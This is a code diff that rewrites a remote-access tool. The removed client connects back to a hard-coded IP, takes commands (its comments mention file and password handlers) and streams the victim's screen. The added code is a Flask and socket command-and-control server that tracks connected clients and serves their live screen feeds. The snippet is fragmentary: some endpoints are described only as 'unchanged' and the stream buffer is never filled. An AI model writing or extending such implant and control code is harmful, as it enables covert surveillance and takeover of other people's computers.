@@ -1,47 +1,49 @@
+from flask import Flask, render_template, request, jsonify, send_file, Response
+import threading
 import socket
-import subprocess
 import os
-import pyautogui
+import time
 import cv2
 import numpy as np
-import threading
-import time
+import base64
 
-HOST = '100.109.211.66'  # Replace with your server's IP
-PORT = 5555
+app = Flask(__name__)
 
-def handle_server_connection():
-    while True:
-        try:
-            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-                s.connect((HOST, PORT))
-                while True:
-                    data = s.recv(1024).decode()
-                    if not data:
-                        break
-                    
-                    # Handle commands (unchanged)
-                    if data == "START_STREAM":
-                        threading.Thread(target=send_stream, args=(s,)).start()
-                    elif data == "STOP_STREAM":
-                        pass  # Implement cleanup if needed
-                    # Other command handlers (file, passwords, etc.)
+clients = {}
+client_lock = threading.Lock()
+UPLOAD_FOLDER = 'uploads'
+os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 
-        except Exception as e:
-            print(f"Error: {e}")
-            time.sleep(5)
+# WebSocket-like streaming (simplified)
+stream_data = {}
 
-def send_stream(sock):
-    while True:
-        try:
-            screenshot = pyautogui.screenshot()
-            frame = cv2.cvtColor(np.array(screenshot), cv2.COLOR_RGB2BGR)
-            _, buffer = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, 50])
-            sock.sendall(buffer.tobytes())
+def start_server_socket():
+    HOST = '0.0.0.0'
+    PORT = 5555
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.bind((HOST, PORT))
+        s.listen()
+        print(f"[*] Listening on {HOST}:{PORT}")
+        while True:
+            conn, addr = s.accept()
+            with client_lock:
+                client_id = f"client_{len(clients) + 1}"
+                clients[client_id] = {"conn": conn, "addr": addr}
+            print(f"[+] {client_id} connected from {addr}")
+
+# Live Stream Endpoint
+@app.route('/api/stream/<client_id>')
+def stream(client_id):
+    def generate():
+        while True:
+            if client_id in stream_data:
+                frame = stream_data[client_id]
+                yield (b'--frame\r\n'
+                       b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
             time.sleep(0.1)
-        except Exception as e:
-            print(f"Stream error: {e}")
-            break
+    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')
 
+# Other endpoints (file upload/download, commands, etc.) remain unchanged
 if __name__ == '__main__':
-    handle_server_connection()
+    threading.Thread(target=start_server_socket, daemon=True).start()
+    app.run(host='0.0.0.0', port=5000, threaded=True)
